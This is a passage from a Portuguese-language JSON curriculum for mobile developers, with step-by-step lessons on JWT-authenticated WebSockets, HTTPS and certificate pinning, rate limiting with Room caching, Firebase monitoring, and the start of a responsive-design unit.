                                    "Escolha um método de autenticação, como JWT (JSON Web Tokens), e instale bibliotecas necessárias (ex: jsonwebtoken no Node.js).",
                                    "Crie uma função para gerar tokens de autenticação após login do usuário, incluindo payload com userId e expiração.",
                                    "Configure armazenamento seguro de tokens no cliente (localStorage ou secure cookies).",
                                    "Implemente refresh tokens para sessões longas.",
                                    "Teste geração e decodificação de tokens manualmente."
                                  ],
                                  "verification": "Tokens gerados são válidos e decodificáveis; verifique com ferramentas como jwt.io.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Node.js",
                                    "jsonwebtoken library",
                                    "Postman para testes de API"
                                  ],
                                  "tips": "Sempre use HTTPS em produção para evitar interceptação de tokens.",
                                  "learningObjective": "Compreender e implementar geração segura de tokens JWT para autenticação.",
                                  "commonMistakes": [
                                    "Não definir expiração no token",
                                    "Armazenar tokens em localStorage sem HttpOnly",
                                    "Usar chaves secretas fracas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Cliente WebSocket com Autenticação Inicial",
                                  "subSteps": [
                                    "Instale biblioteca WebSocket no cliente (ex: socket.io-client ou native WebSocket API).",
                                    "Modifique a URL de conexão para incluir query params com token (ex: ws://server?token=xyz).",
                                    "Implemente handshake inicial enviando token via headers ou mensagem de autenticação pós-conexão.",
                                    "Adicione listener para eventos de autenticação falha e reconexão automática.",
                                    "Codifique recuperação de token do storage local antes da conexão."
                                  ],
                                  "verification": "Conexão WebSocket é estabelecida apenas com token válido; logs mostram autenticação aprovada.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "JavaScript/HTML",
                                    "Socket.io-client",
                                    "Browser DevTools"
                                  ],
                                  "tips": "Use query params para autenticação simples, mas prefira headers customizados em bibliotecas como Socket.io.",
                                  "learningObjective": "Integrar autenticação no cliente WebSocket durante o handshake.",
                                  "commonMistakes": [
                                    "Expor token em logs de console",
                                    "Não tratar falhas de autenticação",
                                    "Ignorar CORS para WebSockets"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Validação de Autenticação no Servidor WebSocket",
                                  "subSteps": [
                                    "Configure servidor WebSocket (ex: socket.io ou ws library no Node.js).",
                                    "Extraia token do query param ou header na conexão incoming.",
                                    "Crie middleware para validar token usando jsonwebtoken.verify().",
                                    "Rejeite conexões inválidas com close event e código de erro específico.",
                                    "Armazene userId decodificado na sessão do socket para autorização posterior."
                                  ],
                                  "verification": "Servidor rejeita conexões sem token ou com token inválido; aceita apenas válidos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Node.js",
                                    "socket.io ou ws library",
                                    "jsonwebtoken"
                                  ],
                                  "tips": "Use rate limiting em conexões para prevenir ataques de força bruta.",
                                  "learningObjective": "Validar e autorizar conexões WebSocket no backend.",
                                  "commonMistakes": [
                                    "Não verificar expiração do token",
                                    "Compartilhar sockets não autenticados",
                                    "Vazar erros de validação para o cliente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Depurar Conexão Autenticada",
                                  "subSteps": [
                                    "Crie scripts de teste com tokens válidos e inválidos usando ferramentas como wscat.",
                                    "Monitore logs de cliente e servidor para fluxos de autenticação.",
                                    "Implemente reconexão automática com reautenticação em caso de perda de conexão.",
                                    "Teste cenários de concorrência com múltiplos clientes.",
                                    "Adicione métricas de segurança, como logs de tentativas falhas."
                                  ],
                                  "verification": "100% das conexões com token válido succeedem; inválidas são rejeitadas em <1s.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "wscat CLI",
                                    "Postman WebSocket",
                                    "Browser console"
                                  ],
                                  "tips": "Use ambientes de staging para testes realistas com tráfego simulado.",
                                  "learningObjective": "Garantir robustez e segurança na integração autenticada.",
                                  "commonMistakes": [
                                    "Não testar tokens expirados",
                                    "Ignorar reconexões sem reauth",
                                    "Falta de logs estruturados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel, integre WebSockets autenticados para que apenas usuários logados recebam mensagens em tempo real de um servidor Node.js/Socket.io, usando JWT no query param da conexão.",
                              "finalVerifications": [
                                "Conexão WebSocket falha sem token válido.",
                                "Token expirado causa desconexão imediata.",
                                "UserId é corretamente associado à sessão socket no servidor.",
                                "Mensagens são roteadas apenas para sockets autenticados.",
                                "Reconexão preserva autenticação sem relogin.",
                                "Nenhum token é exposto em payloads de mensagens."
                              ],
                              "assessmentCriteria": [
                                "Código cliente inclui token no handshake (100% cobertura).",
                                "Servidor valida token em todas as conexões (sem bypass).",
                                "Tratamento de erros cobre 90% dos cenários comuns.",
                                "Performance: latência <200ms em autenticação.",
                                "Segurança: ausência de OWASP Top 10 vulnerabilidades em WebSockets.",
                                "Documentação clara de setup e uso."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Autenticação e autorização JWT.",
                                "Desenvolvimento Mobile: Integração em apps React Native/Flutter.",
                                "Cloud Computing: Deploy em AWS API Gateway WebSockets.",
                                "Banco de Dados: Armazenamento de sessões em Redis.",
                                "Testes de Software: Unit tests para validação de tokens."
                              ],
                              "realWorldApplication": "Aplicações de chat colaborativo (ex: Slack), dashboards financeiros em tempo real (ex: trading apps), jogos multiplayer online e notificações push seguras em e-commerces."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.3",
                        "name": "Segurança e Melhores Práticas na Integração",
                        "description": "Princípios de segurança e otimização para integrações de apps móveis com APIs e WebSockets, incluindo HTTPS, rate limiting e monitoramento.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.3.1",
                            "name": "Aplicar HTTPS e certificados em integrações",
                            "description": "Configurar todas as conexões (REST e WebSocket) para usar HTTPS/TLS, validando certificados e evitando ataques Man-in-the-Middle em apps móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de HTTPS, TLS e Certificados Digitais",
                                  "subSteps": [
                                    "Estude o protocolo HTTPS como camada segura sobre HTTP usando TLS/SSL.",
                                    "Aprenda sobre certificados X.509, CAs (Certificate Authorities) como Let's Encrypt e autoassinados.",
                                    "Entenda o handshake TLS: negociação de cifras, autenticação e troca de chaves.",
                                    "Identifique ataques MITM e como certificados pinning previne eles.",
                                    "Revise conceitos de pinning de certificado e validação de cadeia de confiança."
                                  ],
                                  "verification": "Resuma em um diagrama o fluxo de handshake TLS e liste 3 diferenças entre HTTP e HTTPS.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial do Mozilla sobre TLS: https://wiki.mozilla.org/Security/Server_Side_TLS",
                                    "Vídeo introdutório sobre HTTPS no YouTube (ex: 'HTTPS Everywhere')",
                                    "Ferramenta Wireshark para visualizar tráfego"
                                  ],
                                  "tips": [
                                    "Use analogias como 'cadeado no envelope' para entender criptografia.",
                                    "Instale extensões de navegador como HTTPS Everywhere para observação prática."
                                  ],
                                  "learningObjective": "Explicar como HTTPS protege contra MITM e o papel dos certificados na autenticação.",
                                  "commonMistakes": [
                                    "Confundir SSL com TLS (TLS é o sucessor).",
                                    "Ignorar expiração de certificados autoassinados."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e Configurar Certificados SSL/TLS",
                                  "subSteps": [
                                    "Instale OpenSSL ou use Let's Encrypt com Certbot para gerar certificados gratuitos.",
                                    "Gere um certificado autoassinado para testes: openssl req -x509 -newkey rsa:4096.",
                                    "Configure pinning de certificado gerando hash SHA-256 do certificado público.",
                                    "Instale o certificado no servidor (ex: /etc/ssl/ para Apache/Nginx).",
                                    "Valide o certificado com ferramentas como openssl x509 -in cert.pem -text -noout."
                                  ],
                                  "verification": "Execute comandos para gerar e validar um certificado, confirmando sem erros.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "OpenSSL instalado (Linux/Mac: brew install openssl)",
                                    "Certbot para Let's Encrypt: https://certbot.eff.org/",
                                    "Servidor de teste local (ex: Node.js ou Nginx)"
                                  ],
                                  "tips": [
                                    "Use Let's Encrypt para produção; autoassinados apenas para dev.",
                                    "Armazene chaves privadas com permissões 600 para segurança."
                                  ],
                                  "learningObjective": "Gerar e instalar certificados válidos para uso em servidores e clientes.",
                                  "commonMistakes": [
                                    "Usar chaves RSA < 2048 bits (inseguro).",
                                    "Expor chaves privadas em repositórios Git."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar HTTPS em APIs REST no Servidor",
                                  "subSteps": [
                                    "Configure o servidor web (Nginx/Apache) para redirecionar HTTP para HTTPS.",
                                    "Em Node.js/Express, use o módulo 'https' com opções key e cert.",
                                    "Habilite HSTS (HTTP Strict Transport Security) no cabeçalho.",
                                    "Teste com curl -k https://localhost/api para ignorar autoassinados inicialmente.",
                                    "Implemente OCSP stapling para verificação rápida de revogação."
                                  ],
                                  "verification": "Acesse a API via HTTPS sem warnings no navegador e confirme HSTS ativo.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Node.js com Express: npm install express https",
                                    "Nginx config exemplo: https://nginx.org/en/docs/http/configuring_https_servers.html",
                                    "Postman para testar endpoints REST seguros"
                                  ],
                                  "tips": [
                                    "Sempre force HTTPS com 301 redirects.",
                                    "Monitore logs para erros de handshake TLS."
                                  ],
                                  "learningObjective": "Implementar servidor REST totalmente seguro com HTTPS e cabeçalhos de segurança.",
                                  "commonMistakes": [
                                    "Esquecer de configurar CSP (Content Security Policy) junto.",
                                    "Não testar com clientes que rejeitam autoassinados."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar WebSocket Secure (WSS) e Validação em Apps Móveis",
                                  "subSteps": [
                                    "Substitua ws:// por wss:// no cliente WebSocket.",
                                    "Em app móvel (React Native/Flutter), configure OkHttp/HTTP client com TrustManager customizado.",
                                    "Implemente certificate pinning no cliente móvel para validar apenas certificados conhecidos.",
                                    "Teste conexão WSS com ferramentas como wscat -c wss://localhost.",
                                    "Integre em app móvel: valide cadeia de certificados e rejeite inválidos."
                                  ],
                                  "verification": "Estabeleça conexão WSS bidirecional no app móvel sem erros de certificado.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Biblioteca ws para Node.js: npm install ws",
                                    "React Native NetInfo e react-native-ssl-pinning",
                                    "Flutter secure_websocket package",
                                    "wscat: npm install -g wscat"
                                  ],
                                  "tips": [
                                    "Use public key pinning (HPKP) com cautela; prefira Certificate Transparency.",
                                    "Em produção, integre com Firebase ou AWS para gerenciamento de certs."
                                  ],
                                  "learningObjective": "Garantir comunicações WebSocket seguras em apps móveis com validação de certificados.",
                                  "commonMistakes": [
                                    "Não lidar com reconexões em fallbacks HTTP.",
                                    "Ignorar validação de hostname no cliente."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Verificar e Mitigar Ataques MITM",
                                  "subSteps": [
                                    "Use ferramentas como sslyze ou testssl.sh para escanear vulnerabilidades TLS.",
                                    "Simule MITM com mitmproxy e confirme que pinning bloqueia.",
                                    "Teste em emulador móvel com proxy configurado para interceptar.",
                                    "Monitore com OWASP ZAP para falhas de segurança em integrações.",
                                    "Documente configuração em README e automatize renovação de certs."
                                  ],
                                  "verification": "Gere relatório de teste sem vulnerabilidades críticas e demonstre bloqueio MITM.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "sslyze: pip install sslyze",
                                    "mitmproxy: mitmproxy.org",
                                    "OWASP ZAP: https://www.zaproxy.org/",
                                    "Android Emulator com proxy"
                                  ],
                                  "tips": [
                                    "Automatize testes com CI/CD (ex: GitHub Actions).",
                                    "Renove certs Let's Encrypt via cron job."
                                  ],
                                  "learningObjective": "Validar implementação contra ataques reais e manter segurança contínua.",
                                  "commonMistakes": [
                                    "Confiar apenas em testes locais sem rede real.",
                                    "Não atualizar cifras TLS para versões modernas (TLS 1.3)."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel (React Native), configure uma API REST para login seguro via HTTPS e WebSocket para mensagens em tempo real via WSS. Gere cert com Let's Encrypt, pinne no cliente móvel e teste com mitmproxy para garantir que tentativas MITM falhem, protegendo dados de usuários.",
                              "finalVerifications": [
                                "Todas conexões REST usam HTTPS com TLS 1.2+ sem warnings.",
                                "WebSockets estabelecem WSS com validação de certificado bem-sucedida.",
                                "Pinning de certificado bloqueia tráfego interceptado por proxy MITM.",
                                "HSTS ativado e cabeçalhos de segurança presentes.",
                                "Certificados válidos, não expirados e com chaves fortes.",
                                "Testes em app móvel confirmam ausência de erros SSL."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de certificados (hash correto, instalação sem erros).",
                                "Cobertura completa de REST e WebSocket com HTTPS/WSS.",
                                "Evidência de testes MITM com falha na interceptação.",
                                "Documentação clara de passos e automação.",
                                "Desempenho: handshake TLS < 300ms em testes.",
                                "Conformidade com OWASP Top 10 (A6: Sensitive Data Exposure)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia e Segurança de Redes: Handshake TLS e cifras simétricas/assimétricas.",
                                "Desenvolvimento Móvel: Integração nativa de SSL pinning em iOS/Android.",
                                "Administração de Sistemas: Gerenciamento de certs com ACME e renovação automatizada.",
                                "Ética e Privacidade: Conformidade com LGPD/GDPR em proteção de dados.",
                                "Testes de Software: Automação de security scanning com ferramentas DevSecOps."
                              ],
                              "realWorldApplication": "Em apps bancários como Nubank ou e-commerce como Mercado Livre, HTTPS/TLS com pinning previne roubo de credenciais e dados sensíveis durante login, pagamentos e chats de suporte, evitando milhões em fraudes MITM em redes Wi-Fi públicas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.2",
                            "name": "Implementar rate limiting e caching",
                            "description": "Adotar estratégias de cache local (ex: Room no Android) e respeitar limites de taxa das APIs para otimizar performance e evitar bloqueios.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Configurar Cache Local com Room",
                                  "subSteps": [
                                    "Estude os conceitos básicos de caching e Room como biblioteca de persistência no Android.",
                                    "Adicione as dependências do Room no build.gradle do módulo app.",
                                    "Crie uma entidade (Entity) para representar os dados da API que serão cacheados.",
                                    "Defina um DAO (Data Access Object) com métodos para inserir, consultar e atualizar dados no cache.",
                                    "Configure o Database class do Room com builders e callbacks."
                                  ],
                                  "verification": "Compilar o projeto sem erros e executar uma query simples no DAO para inserir e recuperar dados mockados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Documentação oficial do Room: https://developer.android.com/training/data-storage/room",
                                    "Dependências: implementation 'androidx.room:room-runtime:2.6.1', kapt 'androidx.room:room-compiler:2.6.1'"
                                  ],
                                  "tips": "Use @Ignore para campos não persistentes e considere versioning no banco para migrações futuras.",
                                  "learningObjective": "Compreender como Room armazena dados localmente para simular cache de API.",
                                  "commonMistakes": [
                                    "Esquecer de anotar a classe Database com @Database.",
                                    "Não usar LiveData ou Flow nos DAOs para observabilidade.",
                                    "Ignorar transações em operações de escrita."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Lógica de Cache nas Chamadas de API",
                                  "subSteps": [
                                    "Crie um Repository pattern que verifique o cache antes de chamar a API.",
                                    "Defina uma estratégia de cache: TTL (Time To Live) de 5-10 minutos para dados voláteis.",
                                    "Implemente método para buscar do cache; se ausente ou expirado, chame a API e salve no cache.",
                                    "Use Retrofit ou OkHttp com interceptors para integrar o cache.",
                                    "Trate erros de rede retornando dados do cache como fallback."
                                  ],
                                  "verification": "Simule chamadas de API sem internet e confirme que dados cacheados são retornados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Retrofit library",
                                    "Exemplo de Repository: https://developer.android.com/topic/libraries/architecture/guide#overview_repositories",
                                    "Postman para mockar APIs"
                                  ],
                                  "tips": "Armazene timestamp de expiração junto aos dados para facilitar verificações.",
                                  "learningObjective": "Integrar cache local para reduzir chamadas desnecessárias à API.",
                                  "commonMistakes": [
                                    "Não invalidar cache após atualizações de dados.",
                                    "Cache infinito sem TTL levando a dados obsoletos.",
                                    "Ignorar threading: use coroutines ou executors para I/O."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Rate Limiting Client-Side",
                                  "subSteps": [
                                    "Estude rate limits da API alvo (ex: 100 requests/minuto).",
                                    "Crie um RateLimiter singleton usando SharedPreferences ou Room para rastrear timestamps de requests.",
                                    "Implemente algoritmo token bucket ou sliding window para controlar taxa.",
                                    "Adicione delay ou queueing se limite excedido, expondo erro amigável ao usuário.",
                                    "Integre no Repository: cheque rate limit antes de cada chamada."
                                  ],
                                  "verification": "Faça múltiplas chamadas simuladas e confirme que não excede o limite configurado (ex: log timestamps).",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Exemplo de RateLimiter: Guava RateLimiter adaptado para Android",
                                    "SharedPreferences docs: https://developer.android.com/reference/android/content/SharedPreferences"
                                  ],
                                  "tips": "Use AtomicLong para contadores thread-safe em cenários multi-thread.",
                                  "learningObjective": "Prevenir violações de rate limits evitando bloqueios de IP ou contas.",
                                  "commonMistakes": [
                                    "Contar requests sem considerar resets de janela de tempo.",
                                    "Não persistir estado do limiter após restarts do app.",
                                    "Rate limit muito agressivo impactando UX."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Otimizar e Monitorar a Implementação",
                                  "subSteps": [
                                    "Escreva unit tests para Repository (mock API e cache).",
                                    "Teste integração com UI: liste dados cacheados vs. frescos.",
                                    "Monitore performance com Profiler: meça latência de chamadas.",
                                    "Adicione logs ou Analytics para rastrear hit/miss de cache e violações de rate.",
                                    "Otimize: evite cache para dados sensíveis ou mutáveis."
                                  ],
                                  "verification": "Rodar testes automatizados com cobertura >80% e simular cenários de alta carga sem falhas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "JUnit, Mockito para tests",
                                    "Android Profiler",
                                    "Firebase Crashlytics para monitoring"
                                  ],
                                  "tips": "Use @Test annotations com coroutines test dispatcher para async tests.",
                                  "learningObjective": "Garantir robustez e performance da solução em produção.",
                                  "commonMistakes": [
                                    "Tests sem mocks levando a chamadas reais de API.",
                                    "Ignorar cenários offline ou lentidão de rede.",
                                    "Logs excessivos impactando performance."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de previsão do tempo usando OpenWeatherMap API (60 calls/minuto), implemente Room para cachear forecasts por cidade (TTL 10min). Antes de chamar API, cheque cache; se miss, aplique rate limiter (máx 50/minuto client-side) e salve resultado. Em offline, mostre cache com aviso 'dados possivelmente desatualizados'.",
                              "finalVerifications": [
                                "App recupera dados do cache sem internet.",
                                "Não excede rate limit em bursts de requests (ver logs).",
                                "Dados expiram corretamente após TTL.",
                                "Fallback para cache em erros 429 (Too Many Requests).",
                                "Performance: latência <2s em 90% das consultas.",
                                "Tests passam em cenários offline/online."
                              ],
                              "assessmentCriteria": [
                                "Código modular com Repository pattern (10pts).",
                                "Cache funcional com TTL e fallback (20pts).",
                                "Rate limiter preciso e thread-safe (20pts).",
                                "Tests unitários com mocks (20pts).",
                                "Integração UI sem crashes (15pts).",
                                "Logs/monitoring implementados (10pts).",
                                "Documentação de uso (5pts)."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Modelagem com Room Entities e DAOs.",
                                "Redes e Performance: Otimização de chamadas HTTP com Retrofit.",
                                "Segurança: Prevenção de abusos e proteção contra DoS client-side.",
                                "Testes de Software: Unit e integration testing com Mockito.",
                                "UX Design: Indicadores de loading/cache para melhor experiência."
                              ],
                              "realWorldApplication": "Apps como Instagram ou Uber usam rate limiting e caching para economizar bateria, reduzir custos de API e evitar bans, garantindo fluidez mesmo em conexões ruins ou picos de uso."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.3",
                            "name": "Monitorar e logar integrações",
                            "description": "Integrar ferramentas de logging e monitoramento (ex: Firebase Analytics) para rastrear falhas em chamadas REST/WebSocket em produção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Configurar Ferramenta de Logging e Monitoramento",
                                  "subSteps": [
                                    "Pesquisar ferramentas adequadas como Firebase Analytics, Sentry ou LogRocket para apps móveis.",
                                    "Criar uma conta no Firebase Console e adicionar o projeto do app.",
                                    "Instalar SDKs necessários via npm/yarn (ex: @firebase/analytics) ou CocoaPods para iOS.",
                                    "Inicializar o Firebase no app com configurações de logging ativadas.",
                                    "Configurar eventos personalizados para chamadas de API."
                                  ],
                                  "verification": "Verificar no Firebase Console se o app está registrado e eventos de teste são enviados.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Firebase Console acesso",
                                    "Documentação oficial Firebase",
                                    "IDE com app móvel existente"
                                  ],
                                  "tips": "Comece com Firebase por ser gratuito e integrado com apps móveis; teste em emulador primeiro.",
                                  "learningObjective": "Entender como integrar uma ferramenta de monitoramento em um app móvel.",
                                  "commonMistakes": [
                                    "Esquecer de adicionar google-services.json/plist",
                                    "Não ativar Analytics no console",
                                    "Ignorar permissões de internet no manifest"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instrumentar Chamadas REST com Logs e Monitoramento",
                                  "subSteps": [
                                    "Identificar pontos de chamadas REST no código (ex: usando Axios ou Fetch).",
                                    "Adicionar logs de início de requisição com parâmetros anonimizados (timestamp, endpoint, método).",
                                    "Implementar log de sucesso com status code e duração da chamada.",
                                    "Capturar e logar erros (ex: 4xx/5xx) com stack trace e payload de erro.",
                                    "Integrar com Firebase Analytics usando logEvent para métricas customizadas."
                                  ],
                                  "verification": "Executar chamadas REST simuladas e confirmar logs no Firebase DebugView ou console local.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Código fonte do app",
                                    "Postman para simular APIs",
                                    "Documentação Axios/Fetch"
                                  ],
                                  "tips": "Use try-catch para capturar exceções; evite logar dados sensíveis como senhas.",
                                  "learningObjective": "Instrumentar APIs REST para rastreamento completo de ciclo de vida da requisição.",
                                  "commonMistakes": [
                                    "Logar dados PII",
                                    "Não medir latência",
                                    "Ignorar chamadas assíncronas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instrumentar Chamadas WebSocket com Logs e Monitoramento",
                                  "subSteps": [
                                    "Configurar cliente WebSocket (ex: socket.io-client) e pontos de conexão/desconexão.",
                                    "Logar eventos de conexão: sucesso, falha, reconexão com timestamps.",
                                    "Capturar mensagens recebidas/enviadas com payloads anonimizados e erros de parse.",
                                    "Implementar heartbeat/ping para detectar timeouts e logá-los.",
                                    "Enviar métricas para Firebase como eventos customizados (ex: 'websocket_error')."
                                  ],
                                  "verification": "Simular WebSocket com servidor local e verificar logs de eventos no dashboard Firebase.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Servidor WebSocket de teste (Node.js socket.io)",
                                    "Código do app móvel",
                                    "Ferramentas como WebSocket King"
                                  ],
                                  "tips": "Use IDs de sessão para correlacionar logs; configure reconexão automática.",
                                  "learningObjective": "Rastrear estados e falhas em comunicações em tempo real via WebSocket.",
                                  "commonMistakes": [
                                    "Não logar reconexões",
                                    "Logar payloads completos sem sanitização",
                                    "Ignorar eventos de close"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Alertas, Análise de Falhas e Deploy em Produção",
                                  "subSteps": [
                                    "Definir thresholds para alertas (ex: >5% falhas em 1h) no Firebase ou Google Cloud Monitoring.",
                                    "Configurar filtros para falhas específicas (REST 5xx, WebSocket disconnects).",
                                    "Integrar com ferramentas de notificação (ex: Slack/Email via Firebase Extensions).",
                                    "Deploy o app atualizado em produção (App Store/Google Play ou staging).",
                                    "Monitorar logs reais por 24h e analisar padrões de falhas."
                                  ],
                                  "verification": "Gerar falhas artificiais e confirmar alertas enviados; revisar dashboard de produção.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Firebase Console",
                                    "Conta de deploy (Firebase Hosting ou stores)",
                                    "Ferramentas de notificação"
                                  ],
                                  "tips": "Use amostragem em produção para reduzir custos; teste alertas em staging primeiro.",
                                  "learningObjective": "Estabelecer monitoramento proativo com alertas para produção.",
                                  "commonMistakes": [
                                    "Thresholds muito baixos gerando ruído",
                                    "Não testar em produção simulada",
                                    "Esquecer de mascarar logs sensíveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel, integre Firebase Analytics para logar falhas em chamadas REST de login (ex: 401 Unauthorized) e WebSocket de mensagens em tempo real (ex: desconexões por rede fraca). Simule perda de rede, verifique logs no console mostrando timestamp, endpoint '/login', erro 'timeout' e alerta automático via email.",
                              "finalVerifications": [
                                "Logs de REST/WebSocket aparecem no Firebase Dashboard com detalhes completos.",
                                "Falhas simuladas disparam alertas em <5 minutos.",
                                "Métricas de latência e taxa de erro são calculadas corretamente.",
                                "Nenhum dado sensível vaza nos logs.",
                                "Sistema persiste após deploy em produção sem perda de logs.",
                                "Análise histórica mostra padrões de falhas identificáveis."
                              ],
                              "assessmentCriteria": [
                                "Cobertura completa: 100% das chamadas REST/WebSocket logadas.",
                                "Detalhes nos logs: timestamp, status, duração, erro stack.",
                                "Alertas configurados com thresholds realistas e notificações funcionais.",
                                "Performance: logging adiciona <50ms overhead por chamada.",
                                "Segurança: logs sanitizados, sem PII ou chaves expostas.",
                                "Escalabilidade: suporta 1000+ eventos/min sem falhas."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Sanitização de logs e conformidade GDPR.",
                                "DevOps: Integração CI/CD com monitoramento automatizado.",
                                "Análise de Dados: Uso de métricas para dashboards BI.",
                                "Redes: Entendimento de protocolos REST/WebSocket e falhas de rede.",
                                "Qualidade de Software: Práticas de observability e debugging."
                              ],
                              "realWorldApplication": "Em apps de delivery como Uber Eats, monitorar falhas em chamadas REST para rastreamento de pedidos e WebSockets para updates em tempo real de motoristas, permitindo detecção rápida de outages de API e redução de churn por falhas invisíveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.5",
                    "name": "UI/UX para Dispositivos Móveis",
                    "description": "Princípios de design responsivo, gestos touch e adaptação a diferentes tamanhos de tela.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.5.1",
                        "name": "Princípios de Design Responsivo",
                        "description": "Conceitos fundamentais para criar interfaces que se adaptam automaticamente a diferentes dispositivos e resoluções de tela, garantindo usabilidade em mobiles.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.1.1",
                            "name": "Compreender o conceito de design responsivo",
                            "description": "Explicar o que é design responsivo, sua importância em aplicações móveis e os pilares como fluid grids, layouts flexíveis e media queries.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a definição básica de Design Responsivo",
                                  "subSteps": [
                                    "Pesquisar a definição de design responsivo em fontes confiáveis como MDN Web Docs.",
                                    "Identificar os principais problemas resolvidos, como incompatibilidade em diferentes tamanhos de tela.",
                                    "Explicar em suas próprias palavras o conceito de um site que se adapta automaticamente.",
                                    "Comparar com design fixo para destacar diferenças.",
                                    "Anotar exemplos cotidianos de sites não responsivos."
                                  ],
                                  "verification": "Escrever uma definição clara em 3-5 frases e compartilhar com um colega para feedback.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Documentação MDN Web Docs",
                                    "Bloco de notas"
                                  ],
                                  "tips": "Use analogias como roupas que se ajustam ao corpo para facilitar a compreensão.",
                                  "learningObjective": "Definir design responsivo e diferenciar de abordagens não adaptáveis.",
                                  "commonMistakes": [
                                    "Confundir com design adaptativo (que usa múltiplos layouts fixos)",
                                    "Ignorar o foco em usabilidade móvel"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender a importância em aplicações móveis",
                                  "subSteps": [
                                    "Analisar estatísticas de uso móvel (ex: mais de 50% do tráfego web é mobile).",
                                    "Discutir impactos negativos de sites não responsivos (alta taxa de rejeição, perda de SEO).",
                                    "Explorar benefícios como melhor UX, SEO aprimorado e acessibilidade.",
                                    "Estudar casos reais de apps móveis que falharam por falta de responsividade.",
                                    "Listar razões específicas para desenvolvedores de apps móveis priorizarem isso."
                                  ],
                                  "verification": "Criar uma lista de 5 benefícios e 3 riscos, justificando cada um.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Internet para estatísticas (Statista, Google Analytics)",
                                    "Vídeos curtos sobre mobile-first"
                                  ],
                                  "tips": "Pense no usuário: 'Mobile first' significa priorizar telas pequenas.",
                                  "learningObjective": "Explicar por que design responsivo é essencial para apps móveis e web.",
                                  "commonMistakes": [
                                    "Subestimar o impacto no SEO do Google",
                                    "Focar apenas em estética, ignorando performance"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o pilar: Fluid Grids",
                                  "subSteps": [
                                    "Estudar o conceito de grids baseados em porcentagens ao invés de pixels fixos.",
                                    "Experimentar no CodePen: criar um grid simples com width: 100% / número de colunas.",
                                    "Analisar como fluid grids se redimensionam com a tela.",
                                    "Comparar grids fixos vs fluidos em diferentes resoluções.",
                                    "Identificar ferramentas como CSS Grid ou frameworks como Bootstrap."
                                  ],
                                  "verification": "Construir um grid de 3 colunas fluidas e testar em diferentes tamanhos de navegador.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CodePen ou editor HTML/CSS local",
                                    "Documentação CSS Grid/ Flexbox"
                                  ],
                                  "tips": "Use calc() ou frações (%) para precisão em grids fluidos.",
